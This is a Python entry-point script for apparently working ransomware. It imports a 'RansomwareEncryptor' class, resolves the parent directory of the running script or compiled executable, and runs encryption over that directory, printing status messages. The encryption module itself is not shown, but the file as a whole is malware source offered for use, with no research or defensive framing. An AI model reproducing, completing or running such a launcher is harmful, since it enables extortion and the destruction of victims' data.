import os
import sys
from ransomware_module import RansomwareEncryptor

def main():
    # Get the correct base path for both script and executable
    if getattr(sys, 'frozen', False):
        # Running as compiled executable
        exe_path = os.path.dirname(sys.executable)
        base_directory = os.path.dirname(exe_path)
    else:
        # Running as script
        script_path = os.path.dirname(os.path.abspath(__file__))
        base_directory = os.path.dirname(script_path)

    print(f"[INFO] Target directory: {base_directory}")

    try:
        encryptor = RansomwareEncryptor(base_directory)
        encryptor.handle_encryption()
        print("[INFO] Operation completed successfully.")
    except Exception as e:
        print(f"[ERROR] Operation failed: {e}")

if __name__ == '__main__':
    main()